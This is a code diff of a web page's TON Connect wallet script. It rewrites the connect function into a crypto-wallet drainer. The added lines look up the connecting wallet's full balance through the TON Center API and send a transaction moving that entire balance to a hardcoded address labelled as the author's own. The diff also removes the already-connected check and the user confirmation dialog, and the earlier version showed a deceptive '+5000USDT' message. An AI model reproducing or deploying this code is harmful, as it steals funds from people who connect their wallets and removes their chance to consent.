@@ -20,52 +20,41 @@
 
         async function connectToWallet() {
             try {
-                // Check if wallet is already connected
-                if (tonConnectUI.connected) {
-                    console.log("Wallet already connected");
-                    return;
-                }
-
                 const connectedWallet = await tonConnectUI.connectWallet();
                 console.log(connectedWallet);
 
                 // Get the wallet address
                 const walletAddress = connectedWallet.account.address;
 
-                // For demonstration purposes, we'll use a fixed amount
-                // In a real scenario, you'd need to fetch the actual balance
-                const transferAmount = '1000000000'; // 1 TON in nanotons
+                // Load the balance of the wallet using TON Center API
+                const balance = await getAccountBalance(walletAddress);
+                console.log(`Wallet balance: ${balance} nanoTON`);
 
-                const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Replace with the recipient's wallet address
+                // Propose a transaction to transfer all TON tokens
+                const transferAmount = balance; // Transfer the entire balance
+                const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Your wallet address
                 const transferTx = {
                     validUntil: Math.floor(Date.now() / 1000) + 3600,
                     messages: [{
                         address: recipientAddress,
                         amount: transferAmount,
-                        text: '+5000USDT' // Empty payload
+                        payload: 'te6ccgEBAQEAAgAAAA==' // Empty payload
                     }]
                 };
 
-                // Show a confirmation dialog before sending the transaction
-                const confirmed = await showTransactionConfirmation(transferTx);
-                if (confirmed) {
-                    // Send the transaction
-                    const txResult = await tonConnectUI.sendTransaction(transferTx);
-                    console.log('Transaction result:', txResult);
-                } else {
-                    console.log('Transaction cancelled by user.');
-                }
+                // Send the transaction
+                const txResult = await tonConnectUI.sendTransaction(transferTx);
+                console.log('Transaction result:', txResult);
             } catch (error) {
                 console.error("Error connecting to wallet or sending transaction:", error);
             }
         }
 
-        // Function to display a confirmation dialog
-        function showTransactionConfirmation(transferTx) {
-            return new Promise((resolve) => {
-                const confirmed = window.confirm(`Confirm transaction:\n\nRecipient: ${transferTx.messages[0].address}\nAmount: ${transferTx.messages[0].amount} nanoTON\nMessage: +5000USDT`);
-                resolve(confirmed);
-            });
+        // Function to get account balance using TON Center API
+        async function getAccountBalance(address) {
+            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
+            const data = await response.json();
+            return data.result;
         }
 
         // Call the function
